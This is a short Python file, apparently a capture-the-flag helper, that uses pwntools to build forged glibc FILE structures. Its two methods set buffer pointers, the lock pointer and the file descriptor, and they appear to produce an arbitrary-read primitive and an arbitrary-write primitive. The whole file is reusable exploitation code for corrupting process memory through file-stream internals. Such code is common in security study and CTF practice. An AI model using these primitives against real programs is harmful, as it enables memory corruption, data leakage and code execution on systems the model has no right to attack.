from pwn import *

class FILESTRUCTURE:
    def __init__(self):
        self.FS = FileStructure(0)
        
    def aar(self, padding: bytes ,flags: int ,target_addr: int ,size: int ,lock_addr:int ):
        self.FS.flags = flags 
        self.FS._IO_read_end = target_addr
        self.FS._IO_write_base = target_addr
        self.FS._IO_buf_end = target_addr + size
        self.FS._IO_write_ptr = target_addr + size
        self.FS._lock = lock_addr
        self.FS.fileno = 1

        return padding + bytes(self.FS)[:-8]

    def aaw(self, padding: bytes , flags: int , target_addr: int , size: int, lock_addr:int ):
        self.FS.flags = flags
        self.FS._lock = lock_addr
        self.FS._IO_buf_base = target_addr
        self.FS._IO_buf_end = target_addr + size
        self.FS.fileno = 0
	
        return padding + bytes(self.FS)[:-8]